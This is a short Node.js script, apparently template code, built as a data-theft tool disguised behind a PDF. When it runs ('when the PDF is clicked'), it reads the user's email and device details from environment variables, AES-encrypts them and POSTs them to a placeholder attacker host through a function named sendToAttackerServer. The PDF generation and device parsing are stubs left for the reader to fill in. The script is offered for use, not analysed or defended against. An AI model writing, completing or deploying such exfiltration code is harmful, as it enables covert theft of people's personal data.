const nodemailer = require('nodemailer');
const os = require('os');
const CryptoJS = require('crypto-js');
const request = require('request');

function getUserInput() {
  const userEmail = process.env.USER_EMAIL || '';
  const userAgent = process.env.HTTP_USER_AGENT || '';
  const device = extractDeviceInfo(userAgent);

  const userData = {
    email: userEmail,
    device
  };

  return userData;
}

function extractDeviceInfo(userAgent) {
  // Replace this code with your logic to extract device information from the user agent string
  // Example:
  // const parsedUserAgent = parseUserAgent(userAgent);
  // const device = parsedUserAgent.device;
  // return device;

  return 'Device Name'; // Replace with the extracted device information
}

function generatePDF() {
  // Replace this code with your logic to generate the PDF document
  // Example:
  // const pdfContent = generatePDFContent();
  // savePDFToFile(pdfContent, 'output.pdf');

  console.log('Generating PDF...');
}

function sendToAttackerServer(data) {
  // Replace this code with your logic to send the extracted data to the attacker's server

  const options = {
    url: 'https://attacker-server.com/data', // Replace with the actual URL of the attacker's server
    method: 'POST',
    body: {
      encryptedData: data
    },
    json: true
  };

  request(options, (error, response, body) => {
    if (error) {
      console.error('Error sending data to the attacker server:', error);
    } else {
      console.log('Data sent to the attacker server:', body);
    }
  });
}

// Trigger the script when the PDF is clicked
generatePDF();

// Extract user data and send it to the attacker's server
const userData = getUserInput();
const encryptionKey = 'your-encryption-key'; // Replace with your own encryption key
const encryptedData = encryptFile(JSON.stringify(userData), encryptionKey);
sendToAttackerServer(encryptedData);

function encryptFile(data, encryptionKey) {
  const encryptedData = CryptoJS.AES.encrypt(data, encryptionKey).toString();
  return encryptedData;
}
